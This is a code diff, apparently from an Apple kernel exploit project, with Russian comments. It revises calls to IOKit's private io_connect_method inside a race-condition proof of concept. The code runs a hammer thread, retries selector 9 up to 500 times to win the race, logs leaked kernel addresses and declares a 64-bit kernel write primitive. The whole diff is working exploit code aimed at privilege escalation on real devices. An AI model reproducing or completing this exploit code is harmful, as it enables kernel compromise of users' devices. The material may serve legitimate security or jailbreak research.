@@ -5329,6 +5329,17 @@ static BOOL kpHuntPtrOK(uint64_t v)
 
 // RACE PoC: состояние молотилки + сам тред
 extern void kp_rc_kwrite64(uint64_t, uint64_t);
+// io_connect_method: MIG-стаб в IOKit.framework (экспортируется, но не
+// объявлен в SDK-хидере). Полная форма с ool-памятью: ool_input → kernel
+// создаёт IOMemoryDescriptor поверх нашего диапазона → structureInputDescriptor.
+typedef uint64_t *kp_scalar64_t;
+extern kern_return_t io_connect_method(mach_port_t, uint32_t,
+    kp_scalar64_t, mach_msg_type_number_t,
+    io_struct_inband_t, mach_msg_type_number_t,
+    mach_vm_address_t, mach_vm_size_t,
+    kp_scalar64_t, mach_msg_type_number_t *,
+    io_struct_inband_t, mach_msg_type_number_t *,
+    mach_vm_address_t, mach_vm_size_t *);
 static uint64_t gRaceBufs[12];
 static int gRaceN = 0;
 static uint64_t gRacePA = 0;
@@ -5470,15 +5481,19 @@ static void *kpListReaderMulti(void *arg)
     // 4. ФАЗА A: sel9 без молота
     uint64_t vaA = 0;
     {
-        uint64_t outS[32]; memset(outS, 0, sizeof outS);
-        size_t outCnt = sizeof outS;
-        kern_return_t kr9 = io_connect_method(conn, 9, NULL, 0, NULL, 0, NULL, NULL,
-                                              (io_struct_outband_t)outS, (io_struct_inband_t *)&outCnt,
-                                              (io_scalar_inband_t)(uintptr_t)mem, (io_struct_inband_t)(uintptr_t)0x4000,
-                                              NULL, NULL);
-        GNOTE( [NSString stringWithFormat:@"  A: sel9 kr=%#x outCnt=%zu", kr9, outCnt]);
-        for (int i = 0; i < 12; i++) GNOTE( [NSString stringWithFormat:@"    out[%d]=%#llx", i, outS[i]]);
-        vaA = outS[0];
+        io_struct_inband_t outS; memset(outS, 0, sizeof(outS));
+        mach_msg_type_number_t outSCnt = sizeof(outS) / 4;   // MIG: natural_t units
+        mach_msg_type_number_t outCnt = 0;
+        kern_return_t kr9 = io_connect_method(conn, 9,
+                                              NULL, 0, NULL, 0,
+                                              (mach_vm_address_t)mem, 0x4000,
+                                              NULL, &outCnt,
+                                              outS, &outSCnt,
+                                              0, NULL);
+        GNOTE( [NSString stringWithFormat:@"  A: sel9 kr=%#x outCnt=%u outSCnt=%u", kr9, outCnt, outSCnt]);
+        uint64_t *o64 = (uint64_t *)outS;
+        for (int i = 0; i < 12; i++) GNOTE( [NSString stringWithFormat:@"    out[%d]=%#llx", i, o64[i]]);
+        vaA = o64[0];
     }
     if (vaA) {
         ((volatile uint64_t *)res.contents)[0] = 0;
@@ -5508,13 +5523,16 @@ static void *kpListReaderMulti(void *arg)
         pthread_create(&ht, NULL, kpRaceHammer, NULL);
         int hits = 0, other = 0;
         for (int it = 0; it < 500 && !hits; it++) {
-            uint64_t outS[32]; memset(outS, 0, sizeof outS);
-            size_t outCnt = sizeof outS;
-            kern_return_t kr9 = io_connect_method(conn, 9, NULL, 0, NULL, 0, NULL, NULL,
-                                                  (io_struct_outband_t)outS, (io_struct_inband_t *)&outCnt,
-                                                  (io_scalar_inband_t)(uintptr_t)mem, (io_struct_inband_t)(uintptr_t)0x4000,
-                                                  NULL, NULL);
-            uint64_t vaB = outS[0];
+            io_struct_inband_t outS; memset(outS, 0, sizeof(outS));
+            mach_msg_type_number_t outSCnt = sizeof(outS) / 4;
+            mach_msg_type_number_t outCnt = 0;
+            kern_return_t kr9 = io_connect_method(conn, 9,
+                                                  NULL, 0, NULL, 0,
+                                                  (mach_vm_address_t)mem, 0x4000,
+                                                  NULL, &outCnt,
+                                                  outS, &outSCnt,
+                                                  0, NULL);
+            uint64_t vaB = ((uint64_t *)outS)[0];
             if (!vaB) { if (it < 8) GNOTE( [NSString stringWithFormat:@"  B: iter=%d kr=%#x va=0", it, kr9]); continue; }
             ((volatile uint64_t *)res.contents)[0] = 0;
             ((volatile uint64_t *)res.contents)[1] = vaB;
